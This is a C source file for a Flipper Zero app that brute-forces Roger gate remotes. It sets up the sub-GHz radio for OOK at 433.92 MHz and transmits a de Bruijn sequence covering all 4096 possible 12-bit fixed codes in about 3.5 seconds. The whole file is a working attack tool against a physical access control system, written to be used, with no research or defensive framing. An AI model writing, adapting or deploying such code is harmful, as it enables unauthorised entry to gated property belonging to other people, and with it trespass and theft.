// Roger Gate Brute-force App for Flipper Zero
// Uses a de Bruijn sequence B(2,12): one sync pulse + 4096 bits covering
// every 12-bit code exactly once as overlapping windows.  ~3.5 seconds vs
// ~4 minutes for the naive per-code approach.
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <input/input.h>
#include <stdlib.h>
#include <string.h>

#define ROGER_FREQ   433920000
#define DB_ORDER     12
#define DB_LEN       (1 << DB_ORDER)  // 4096

// Pulse timing (µs)
#define BIT1_ON_US   600
#define BIT1_OFF_US  200
#define BIT0_ON_US   200
#define BIT0_OFF_US  600
#define SYNC_ON_US   100
#define SYNC_OFF_US  3100

// LevelDuration slots: 1 sync pair + DB_LEN bit pairs + 1 trailing high
#define SEQ_LEN      (2 + DB_LEN * 2 + 1)

// ── OOK 270 kHz async preset for CC1101 ──────────────────────────────────────
static const uint8_t preset_ook270[] = {
    0x02, 0x0D,  // IOCFG0
    0x03, 0x47,  // FIFOTHR
    0x08, 0x32,  // PKTCTRL0 - async serial, infinite packet
    0x0B, 0x06,  // FSCTRL1
    0x14, 0x00,  // MDMCFG0
    0x13, 0x00,  // MDMCFG1
    0x12, 0x30,  // MDMCFG2 - OOK modulation
    0x11, 0x32,  // MDMCFG3
    0x10, 0x67,  // MDMCFG4 - ~270 kHz bandwidth
    0x18, 0x18,  // MCSM0
    0x19, 0x18,  // FOCCFG
    0x1D, 0x40,  // AGCCTRL0
    0x1C, 0x00,  // AGCCTRL1
    0x1B, 0x03,  // AGCCTRL2
    0x20, 0xFB,  // WORCTRL
    0x22, 0x11,  // FREND0
    0x21, 0xB6,  // FREND1
    0x00, 0x00,  // end marker
    0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // PATABLE
};

// ── De Bruijn B(2,12) via FKM algorithm ──────────────────────────────────────
// Produces exactly 2^12 = 4096 bits; every 12-bit window is unique.
static uint8_t s_db_a[DB_ORDER + 1];
static uint8_t s_db_bits[DB_LEN];
static size_t  s_db_len;

static void db_gen(int t, int p) {
    if(t > DB_ORDER) {
        if(DB_ORDER % p == 0) {
            for(int i = 1; i <= p && s_db_len < DB_LEN; i++) {
                s_db_bits[s_db_len++] = s_db_a[i];
            }
        }
    } else {
        s_db_a[t] = s_db_a[t - p];
        db_gen(t + 1, p);
        for(int j = (int)s_db_a[t - p] + 1; j <= 1; j++) {
            s_db_a[t] = (uint8_t)j;
            db_gen(t + 1, t);
        }
    }
}

// ── Async TX callback ─────────────────────────────────────────────────────────
typedef struct {
    LevelDuration* seq;
    size_t         length;
    size_t         index;
    FuriSemaphore* done;
} TxState;

static LevelDuration tx_callback(void* ctx) {
    TxState* s = ctx;
    if(s->index < s->length) return s->seq[s->index++];
    if(s->index == s->length) {
        s->index++;
        furi_semaphore_release(s->done);
    }
    return level_duration_reset();
}

// ── App context ───────────────────────────────────────────────────────────────
typedef struct {
    FuriMessageQueue* input_queue;
    FuriMutex*        mutex;
    volatile bool     stop;
    volatile bool     tx_done;
} AppCtx;

static void draw_cb(Canvas* canvas, void* ctx) {
    AppCtx* app = ctx;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    bool done = app->tx_done;
    furi_mutex_release(app->mutex);

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 12, "Roger Gate BF");
    canvas_set_font(canvas, FontSecondary);

    if(done) {
        canvas_draw_str(canvas, 2, 28, "Done! 4096 codes sent.");
        canvas_draw_str(canvas, 2, 40, "Press BACK to exit.");
    } else {
        canvas_draw_str(canvas, 2, 28, "Sending de Bruijn seq...");
        canvas_draw_str(canvas, 2, 40, "All 4096 codes in ~3.5s");
        canvas_draw_str(canvas, 2, 54, "BACK to abort");
    }
}

static void input_cb(InputEvent* event, void* ctx) {
    AppCtx* app = ctx;
    furi_message_queue_put(app->input_queue, event, 0);
}

// ── Entry point ───────────────────────────────────────────────────────────────
int32_t roger_gate_app(void* p) {
    UNUSED(p);

    AppCtx app = {
        .input_queue = furi_message_queue_alloc(8, sizeof(InputEvent)),
        .mutex       = furi_mutex_alloc(FuriMutexTypeNormal),
        .stop        = false,
        .tx_done     = false,
    };

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_cb, &app);
    view_port_input_callback_set(vp, input_cb, &app);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);
    view_port_update(vp);

    // Generate de Bruijn sequence (runs in <1 ms on Flipper CPU)
    memset(s_db_a, 0, sizeof(s_db_a));
    s_db_len = 0;
    db_gen(1, 1);

    // Build full LevelDuration sequence on the heap (~32 KB)
    LevelDuration* seq = malloc(SEQ_LEN * sizeof(LevelDuration));
    if(seq) {
        size_t i = 0;
        seq[i++] = level_duration_make(true,  SYNC_ON_US);
        seq[i++] = level_duration_make(false, SYNC_OFF_US);
        for(size_t b = 0; b < DB_LEN; b++) {
            if(s_db_bits[b]) {
                seq[i++] = level_duration_make(true,  BIT1_ON_US);
                seq[i++] = level_duration_make(false, BIT1_OFF_US);
            } else {
                seq[i++] = level_duration_make(true,  BIT0_ON_US);
                seq[i++] = level_duration_make(false, BIT0_OFF_US);
            }
        }
        seq[i++] = level_duration_make(true, BIT1_ON_US);

        TxState tx = {
            .seq    = seq,
            .length = i,
            .index  = 0,
            .done   = furi_semaphore_alloc(1, 0),
        };

        furi_hal_subghz_reset();
        furi_hal_subghz_load_custom_preset(preset_ook270);
        furi_hal_subghz_set_frequency_and_path(ROGER_FREQ);
        furi_hal_subghz_tx();
        furi_hal_subghz_start_async_tx(tx_callback, &tx);

        // Poll for completion (TX takes ~3.5 s); check BACK key while waiting
        while(!app.stop) {
            if(furi_semaphore_acquire(tx.done, furi_ms_to_ticks(50)) == FuriStatusOk) break;
            InputEvent ev;
            while(furi_message_queue_get(app.input_queue, &ev, 0) == FuriStatusOk) {
                if(ev.type == InputTypeShort && ev.key == InputKeyBack) app.stop = true;
            }
        }

        furi_hal_subghz_stop_async_tx();
        furi_hal_subghz_sleep();
        furi_semaphore_free(tx.done);
        free(seq);

        if(!app.stop) {
            furi_mutex_acquire(app.mutex, FuriWaitForever);
            app.tx_done = true;
            furi_mutex_release(app.mutex);
            view_port_update(vp);
            // Wait for BACK press on the done screen
            while(true) {
                InputEvent ev;
                if(furi_message_queue_get(app.input_queue, &ev, furi_ms_to_ticks(100)) == FuriStatusOk) {
                    if(ev.type == InputTypeShort && ev.key == InputKeyBack) break;
                }
            }
        }
    }

    gui_remove_view_port(gui, vp);
    furi_record_close(RECORD_GUI);
    view_port_free(vp);
    furi_mutex_free(app.mutex);
    furi_message_queue_free(app.input_queue);
    return 0;
}
